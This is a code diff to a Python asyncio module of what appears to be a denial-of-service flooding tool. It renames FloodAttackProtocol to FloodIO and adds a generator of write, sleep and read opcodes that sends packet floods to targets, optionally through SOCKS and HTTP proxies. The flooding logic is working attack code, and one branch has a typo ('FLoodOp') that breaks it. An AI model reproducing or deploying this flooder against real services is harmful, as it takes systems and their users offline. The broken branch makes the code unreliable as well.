@@ -5,17 +5,49 @@ import io
 import socket
 from ssl import SSLContext
 import struct
-from typing import BinaryIO, Callable, Optional, Tuple
+from types import GeneratorType
+from typing import Any, BinaryIO, Callable, Generator, Optional, Tuple
 
 from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Proxy
 from python_socks.async_.asyncio import Proxy
 from python_socks._proto import socks4, socks5, http as http_proto
 
-from .core import logger, PacketPayload, Stats
+from .core import logger, Stats
 from .proxies import ProxySet
 
 
-class FloodAttackProtocol(asyncio.Protocol):
+FloodSpecGen = Generator[Tuple[int, Any], None, None]
+
+
+class FloodOp:
+    WRITE = 0
+    READ  = 1
+    SLEEP = 2
+
+
+class FloodSpec:
+
+    @classmethod
+    def from_any(cls, spec, *args) -> FloodSpecGen:
+        if isinstance(spec, GeneratorType): return spec
+        if isinstance(spec, bytes): return cls.from_static(spec, *args)
+        if callable(spec): return cls.from_callable(spec, *args)
+        raise ValueError(f"Don't know how to create spec from {type(spec)}")
+
+    @staticmethod
+    def from_static(packet: bytes, num_packets: int) -> FloodSpecGen:
+        packet_size = len(packet)
+        for _ in range(num_packets):
+            yield FloodOp.WRITE, (packet, packet_size)
+
+    @staticmethod
+    def from_callable(packet: Callable[[], bytes], num_packets: int) -> FloodSpecGen:
+        for _ in range(num_packets):
+            _packet: bytes = packet()
+            yield FloodOp.WRITE, (_packet, len(_packet))
+
+
+class FloodIO(asyncio.Protocol):
 
     def __init__(
         self,
@@ -23,19 +55,18 @@ class FloodAttackProtocol(asyncio.Protocol):
         on_close: asyncio.Future,
         stats: Stats,
         settings: "AttackSettings",
-        payload: PacketPayload
+        flood_spec: FloodSpecGen
     ):
         self._loop = loop
         self._stats = stats
-        self._payload: PacketPayload = payload
-        self._payload_size: Optional[int] = len(payload) if isinstance(payload, bytes) else None
+        self._flood_spec = flood_spec
         self._settings = settings
         self._on_close: asyncio.Future = on_close
         self._on_close.add_done_callback(self._handle_cancellation)
         self._transport = None
         self._handle = None
         self._paused: bool = False
-        self._budget: int = self._settings.requests_per_connection
+        self._read_waiting: bool = False
         self._return_code: bool = False
 
     def connection_made(self, transport) -> None:
@@ -44,9 +75,23 @@ class FloodAttackProtocol(asyncio.Protocol):
         self._stats.track_open_connection()
         if hasattr(self._transport, "pause_reading"):
             self._transport.pause_reading()
-        self._handle = self._loop.call_soon(self._send_packet)
+        self._handle = self._loop.call_soon(self._step)
 
     def data_received(self, data) -> None:
+        # overall, we don't use data at all
+        # do something smarter when corresponding opcode is introduced
+        # we also don't track size of the data received. the only use
+        # for the read opcode right now is to make sure something was
+        # read from the network. in such a case, use of operations like
+        # read(1) does not make much of sense (as the data is already
+        # buffered anyways)
+        if False and hasattr(self._transport, "pause_reading"):
+            self._transport.pause_reading()
+        if self._read_waiting:
+            self._read_waiting = False
+            self._loop.call_soon(self._step)
+
+    def eof_received(self) -> None:
         pass
 
     def connection_lost(self, exc) -> None:
@@ -61,6 +106,8 @@ class FloodAttackProtocol(asyncio.Protocol):
             # EPIPE exception here means that the connection was interrupted
             # we still consider connection to the target "succesful", no need
             # to bump our failure budget
+            # As we typically pause reading, it's unlikely to process EOF from
+            # the peer properly. Thus EPIPE instead is expected to happen.
             self._on_close.set_result(self._return_code)
         else:
             self._on_close.set_exception(exc)
@@ -70,28 +117,38 @@ class FloodAttackProtocol(asyncio.Protocol):
 
     def resume_writing(self):
         self._paused = False
-        if self._handle is None and self._budget > 0:
-            self._handle = self._loop.call_soon(self._send_packet)
+        if self._handle is None:
+            self._handle = self._loop.call_soon(self._step)
 
-    def _prepare_packet(self) -> Tuple[bytes, int]:
-        if self._payload_size is not None:
-            return self._payload, self._payload_size
-        else:
-            packet = self._payload()
-            return packet, len(packet)
-
-    def _send_packet(self) -> None:
+    def _step(self) -> None:
         if not self._transport: return
-        packet, size = self._prepare_packet()
-        self._transport.write(packet)
-        self._stats.track(1, size)
-        self._budget -= 1
+        # XXX: replace with on_dest_connected future
+        #      (how nice would it be to have completion futures with stages)
         self._return_code = True
-        self._handle = None
-        if self._budget <= 0:
+        try:
+            # XXX: this is actually less flexible than would be necessary
+            #      as we still need to keep track of current op & stash
+            op, args = next(self._flood_spec)
+            if op == FloodOp.WRITE:
+                packet, size = args
+                self._transport.write(packet)
+                self._stats.track(1, size)
+                self._handle = None
+                if not self._paused:
+                    self._handle = self._loop.call_soon(self._step)
+            elif op == FloodOp.SLEEP:
+                self._handle = self._loop.call_later(args, self._step)
+            elif op == FLoodOp.READ:
+                # XXX: what about read timeout, do we even need it?
+                #      (it might be okay as long as connection is consumed)
+                self._read_waiting = True
+                if hasattr(self._transport, "resume_reading"):
+                    self._transport.resume_reading()
+            else:
+                raise ValueError(f"Unknown flood opcode {op}")
+        except StopIteration:
             self._transport.close()
-        elif not self._paused and self._budget > 0:
-            self._handle = self._loop.call_soon(self._send_packet)
+            self._transport = None
 
     def _handle_cancellation(self, on_close):
         if on_close.cancelled() and self._transport and not self._transport.is_closing():
@@ -172,6 +229,10 @@ class ProxyProtocol(asyncio.Protocol):
                 if not self._on_close.done():
                     self._on_close.set_exception(exc)
                     self._transport.abort()
+
+    def eof_received(self):
+        if self._downstream_protocol is not None:
+            self._downstream_protocol.eof_received()
 
     def _handle_cancellation(self, on_close):
         if on_close.cancelled() and self._transport and not self._transport.is_closing:
